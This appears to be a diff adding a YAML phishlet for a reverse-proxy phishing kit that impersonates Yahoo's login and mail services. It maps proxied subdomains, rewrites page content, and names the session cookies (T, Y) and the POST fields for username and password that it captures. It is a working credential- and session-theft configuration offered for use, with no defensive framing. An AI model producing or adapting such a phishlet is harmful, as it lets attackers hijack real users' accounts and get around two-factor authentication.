@@ -1,0 +1,86 @@
+name: "yahoo"
+author: '@kkrasta24 telegram'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'csp', orig_sub: 'csp', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'yahoo.com', session: true, is_landing: true, auto_filter: false}
+  - {phish_sub: 'auth', orig_sub: 'login', domain: 'yahoo.net', session: true, is_landing: true, auto_filter: false}
+
+  # - {phish_sub: 's', orig_sub: 's', domain: 'yimg.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'ww1', orig_sub: 'www', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww2', orig_sub: 'www', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'guce', orig_sub: 'guce', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'consent', orig_sub: 'consent', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'ww3', orig_sub: 'www', domain: 'yahoo.net', session: true, is_landing: false, auto_filter: false}
+
+  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'news', orig_sub: 'news', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'finance', orig_sub: 'finance', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'sports', orig_sub: 'sports', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'shopping', orig_sub: 'shopping', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'search', orig_sub: 'search', domain: 'yahoo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yahoo.com', search: 'using your', replace: 'fucking delete your', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 'login.yahoo.com', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 'login.yahoo.net', orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 'csp.yahoo.com',   orig_sub: '', domain: 'yimg.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 's.yimg.com',      orig_sub: '', domain: 'yimg.com',  search: '{domain}',  replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  # - {triggers_on: 's.yimg.com',      orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}/recaptcha/enterprise.js', replace: 'https://{hostname}/recaptcha/enterprise.js', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}/recaptcha', replace: 'https://{hostname}/recaptcha', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.google.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'www.gstatic.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.net', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+  # - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.net', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
+  - {triggers_on: 'login.yahoo.net', orig_sub: 'login', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html']}
+ 
+  - {triggers_on: 'www.yahoo.com', orig_sub: '', domain: 'yahoo.com', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+
+auth_tokens:
+  - domain: '.yahoo.com'
+    keys: ['T','Y']
+
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'post'
+
+auth_urls:
+  - '/CheckCookie'
+
+login:
+  domain: 'login.yahoo.com'
+  path: '/'
